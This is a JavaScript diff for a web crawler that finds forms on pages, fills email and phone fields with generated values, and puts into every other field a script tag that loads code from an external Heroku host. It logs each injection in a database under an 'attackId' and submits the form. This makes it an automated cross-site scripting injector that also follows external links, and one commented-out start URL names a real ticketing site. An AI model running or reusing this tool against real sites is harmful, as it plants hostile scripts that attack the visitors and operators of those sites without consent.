@@ -1,7 +1,13 @@
-const request = require('request');
+var request = require('request');
 const cheerio = require('cheerio');
-const pRequest = require("promisified-request").create();
-const fScraper = require("form-scraper");
+request = request.defaults({ jar: true });
+var pRequest = require("promisified-request").create(request);
+var fScraper = require("form-scraper");
+const shortid = require('shortid');
+
+//Model
+const db = require('./models/db');
+console.log(db);
 
 //helpers
 const emailGenerator = require('./helpers/email_generator');
@@ -9,16 +15,15 @@ const phoneGenerator = require('./helpers/phone_number_generator');
 const emailIds = require('./helpers/email_address_ids');
 const phoneIds = require('./helpers/phone_number_ids');
 
-//const startUrl = 'https://news.ycombinator.com';
+//const startUrl = 'https://tiket.kereta-api.co.id';
 const startUrl = 'https://catkinson19.github.io/test_site/';
 //const depth = 1;
-
-crawlScrape(startUrl, 'external');
 
 function crawlScrape(startUrl, urlSet) {
 
     let scrapedInternalUrls = [];
     let scrapedExternalUrls = [];
+    let bothUrls = [];
 
     request(startUrl, function (err, resp, body) {
         $ = cheerio.load(body);
@@ -31,28 +36,31 @@ function crawlScrape(startUrl, urlSet) {
             const urlREG = new RegExp("http");
             if (urlREG.test(scrapedLink)) {
                 scrapedExternalUrls.push(scrapedLink);
+                bothUrls.push(scrapedLink);
             } else {
                 scrapedInternalUrls.push(`${startUrl}/${scrapedLink}`);
+                bothUrls.push(`${startUrl}/${scrapedLink}`);
             }
 
         })
         let urlsToScrape;
         switch (urlSet) {
             case 'internal':
-            urlsToScrape = scrapedInternalUrls;
+                urlsToScrape = scrapedInternalUrls;
                 break;
             case 'external':
-            urlsToScrape = scrapedExternalUrls;
+                urlsToScrape = scrapedExternalUrls;
                 break;
             case 'both':
-            urlsToScrape = scrapedInternalUrls.concat(scrapedExternalUrls);
+                urlsToScrape = bothUrls;
                 break;
             default:
-            throw new Error('Invalid url set');
+                throw new Error('Invalid url set');
         }
+        console.log(urlsToScrape);
 
         for (let i = 0; i < urlsToScrape.length; i++) {
-            request(scrapedInternalUrls[i], function (err, resp, body) {
+            request(urlsToScrape[i], function (err, resp, body) {
                 $ = cheerio.load(body);
                 let forms = $('form')[0];
                 if (forms) {
@@ -62,7 +70,7 @@ function crawlScrape(startUrl, urlSet) {
                         formId[i] = $(this).attr('id');
                     });
                     formId.join(', ');
-                    console.log(`I found ${formId.length} form(s) on ${scrapedInternalUrls[i]}`);
+                    console.log(`I found ${formId.length} form(s) on ${urlsToScrape[i]}`);
                     for (let j = 0; j < formId.length; j++) {
 
                         //Current form Id
@@ -86,23 +94,20 @@ function crawlScrape(startUrl, urlSet) {
                             } else if (phoneIds.phoneNumberIds.includes(inputId[x])) {
                                 formObject[inputId[x]] = phoneGenerator.phoneNumber();
                             } else {
-                                formObject[inputId[x]] = 'test';
+                                let attackId = shortid.generate();
+
+                                //Record Attack
+                                db.createAttackDB(attackId, formId[j], inputId[x], scrapedInternalUrls[i]);
+                                formObject[inputId[x]] = `<script src=https://rocky-savannah-17002.herokuapp.com/a/${attackId}></script>`;
+
+                                //Submit Form
+                                var formStructure = fScraper.fetchForm(`#${formId[j]}`, scrapedInternalUrls[i], pRequest);
+
+                                fScraper.submitForm(formObject, fScraper.provideForm(formStructure), pRequest).then(function (response) {
+                                    console.log(response.body);
+                                });
                             }
                         }
-                        console.log(formObject);
-/*
-                        //Form scraper
-                        let pRequest = require("promisified-request").create();
-                        let fScraper = require("form-scraper");
-                        let formStructure = fScraper.fetchForm(formId[j], scrapedInternalUrls[i], pRequest);
-
-                        //Fix me here
-                        //var loginDetails = { user: "my user", password: "my password" };
-
-                        fScraper.submitForm(loginDetails, fScraper.provideForm(formStructure), pRequest).then(function (response) {
-                            console.log(response.body);
-                        })
-                        */
                     }
                 }
             })
@@ -110,4 +115,6 @@ function crawlScrape(startUrl, urlSet) {
     });
 };
 
-//function searchForm();
+module.exports = {
+    crawlScrape: crawlScrape
+}
